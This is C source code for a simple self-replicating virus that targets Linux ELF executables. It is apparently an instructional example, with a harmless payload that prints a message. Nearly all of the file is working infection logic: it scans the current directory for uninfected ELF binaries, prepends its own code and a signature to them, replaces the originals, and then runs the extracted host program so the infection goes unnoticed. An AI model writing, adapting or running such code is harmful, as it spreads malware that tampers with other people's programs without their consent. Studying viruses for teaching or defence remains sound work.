#include <stdio.h>      	// for basic IO
#include <dirent.h>       	// for directories
#include <stdbool.h>      	// macros for boolean data type
#include <sys/stat.h>     	// structure of data returned by *stat(). 
#include <sys/sendfile.h> 	// for sendfile()
#include <sys/wait.h>	  	// for waitpid()
#include <fcntl.h>        	// for file control operations 
#include <unistd.h>		// for close()

#define SIGNATURE 4033
#define SIZE 14056
#define PAYLOAD_MESSAGE "Hello! This is a simple virus!"
#define TEMP_FILENAME ".tempFile"

void executeSomethingBad();
char* getCleanHostFile(int self_inode);
bool isOriginalVirus(int vfd);
bool isELF(char* fileName);
bool isClean(char* fileName);
void infectHostFile(char* hostFileName, int vfd);
void appendSignature(int vfd, char* fileName, mode_t mode, int size);
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]);

void main(int argc, char *argv[]) {
	int vfd = open(argv[0], O_RDONLY);
	struct stat st;
	fstat(vfd, &st);

	executeSomethingBad();
	
	char* cleanHostName = getCleanHostFile(st.st_ino);
	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, vfd);
		 

	if(isOriginalVirus(vfd))
		appendSignature(vfd, argv[0], st.st_mode, st.st_size);
	else
		executeHostPart(vfd, st.st_mode, st.st_size, argv);

	close(vfd);
}

/**
 * Execute malacious script
 */
void executeSomethingBad() {
	puts(PAYLOAD_MESSAGE);
}

/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}

/**
 * Gets an ELF file's name that is not yet infected in the current working directory. 
 * If no such files are found, NULL is returned
 */
char* getCleanHostFile(int self_inode) {
	struct stat st;
	DIR *dir = opendir("./");
	struct dirent *dp;
	while((dp = readdir(dir)) != NULL){
		stat(dp->d_name, &st);
		if(st.st_ino == self_inode) continue;	// Don't infect self
		if(isELF(dp->d_name) && isClean(dp->d_name)){
			closedir(dir);
			return dp->d_name;
		}
	}

	closedir(dir);
	return NULL;
}

/**
 * Returns true if the file's format is ELF
 * (Executeable and Linkable Format)
 * ELF files have the first four bytes as 
 * {0x7f, 'E', 'L', 'F'}.
 */
bool isELF(char* fileName) {
	if(fileName[0] == '.') return false;

	int hfd = open(fileName, O_RDONLY);
	char header[4];
	read(hfd, header, 4);
	close(hfd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the last few bytes of the file 
 */
bool isClean(char* fileName) {
	int signature;
	int fd = open(fileName, O_RDONLY);
	lseek(fd, -1 * sizeof(signature), SEEK_END);
	read(fd, &signature, sizeof(signature));
	close(fd);
	return signature != SIGNATURE;
}

/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host, and signature;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int vfd) {
	int hfd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(hfd, &st);
	int hostSize = st.st_size;

	int signature = SIGNATURE;
	
	int tfd = creat(TEMP_FILENAME, st.st_mode);	
	// Virus->Host->Signature
	sendfile(tfd, vfd, NULL, SIZE);
	sendfile(tfd, hfd, NULL, hostSize);
	write(tfd, &signature, sizeof(signature));

	rename(TEMP_FILENAME, hostFileName);

	close(tfd);
	close(hfd);
}

/**
 * Append signature to the virus 
 */
void appendSignature(int vfd, char* fileName, mode_t mode, int size) {
	int tfd = creat(TEMP_FILENAME, mode);
	int signature = SIGNATURE;
	lseek(vfd, 0, SEEK_SET);
	sendfile(tfd, vfd, NULL, size);
	write(tfd, &signature, sizeof(signature));
	close(tfd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int vfd, mode_t mode, int totalSize, char *argv[]) {
	int tfd = creat(TEMP_FILENAME, mode);

	lseek(vfd, SIZE, SEEK_SET);
	int signatureSize = sizeof(SIGNATURE);
	int hostSize = totalSize - SIZE - signatureSize;
	sendfile(tfd, vfd, NULL, hostSize);
	close(tfd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}
